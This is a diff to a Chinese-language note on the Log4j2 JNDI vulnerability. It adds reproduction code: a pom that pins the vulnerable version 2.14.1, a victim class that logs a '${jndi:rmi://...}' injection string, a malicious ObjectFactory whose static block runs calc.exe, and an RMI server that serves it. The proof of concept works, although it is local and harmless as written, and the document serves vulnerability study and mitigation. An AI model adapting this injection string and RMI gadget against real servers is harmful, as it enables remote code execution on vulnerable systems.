@@ -61,9 +61,9 @@ zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 
 
 
-参考：
+参考官网信息：
 
-![](./log4j2_info.png)
+![官网信息](./log4j2_info.png)
 
 
 
@@ -74,3 +74,135 @@ zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 [2. 缓解措施，环境变量名称应该为LOG4J_FORMAT_MSG_NO_LOOKUPS](https://github.com/apache/logging-log4j2/pull/614)
 
 [3. Apache Log4j2 github地址](https://github.com/apache/logging-log4j2)
+
+[4. 复现代码](https://github.com/YoungBear/log4j2demo)
+
+
+
+# 复现代码
+
+## 1. pom依赖
+
+```xml
+    <dependencies>
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-api</artifactId>
+            <version>2.14.1</version>
+        </dependency>
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-core</artifactId>
+            <version>2.14.1</version>
+        </dependency>
+    </dependencies>
+```
+
+## 2. 被攻击代码
+
+```java
+package com.example.log4j2demo;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class Log4j2Demo {
+    private static final Logger LOGGER = LogManager.getLogger(Log4j2Demo.class);
+
+
+    public static void main(String[] args) {
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        System.out.println("begin of print log...");
+
+        String logContent = "${jndi:rmi://127.0.0.1:1099/evil}";
+        LOGGER.error("hello, {}", logContent);
+
+        System.out.println("end of print log...");
+
+    }
+}
+```
+
+
+
+## 2. 恶意代码(以启动计算器为例)
+
+```java
+package com.example.log4j2demo;
+
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.util.Hashtable;
+
+public class EvilObj implements ObjectFactory {
+
+    static {
+        System.out.println("begin to run EvilObj static code...");
+
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc.exe"});
+            InputStream inputStream = p.getInputStream();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                System.out.println(line);
+            }
+            p.waitFor();
+            inputStream.close();
+            reader.close();
+            p.destroy();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
+        System.out.println("getObjectInstance of EvilObj ...");
+        return null;
+    }
+
+}
+
+```
+
+
+
+## 4. RMIServer
+
+```java
+package com.example.log4j2demo;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer {
+    public static void main(String[] args) {
+        try {
+            LocateRegistry.createRegistry(1099);
+            Registry registry = LocateRegistry.getRegistry();
+            System.out.println("Create RMI registry on port 1099...");
+
+            String className = "com.example.log4j2demo.EvilObj";
+            Reference reference = new Reference(className, className, className);
+            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+            registry.bind("evil", referenceWrapper);
+            System.out.println("registry bind ...");
+
+        } catch (Exception e) {
+            e.printStackTrace();
+
+        }
+    }
+}
+
+```
+
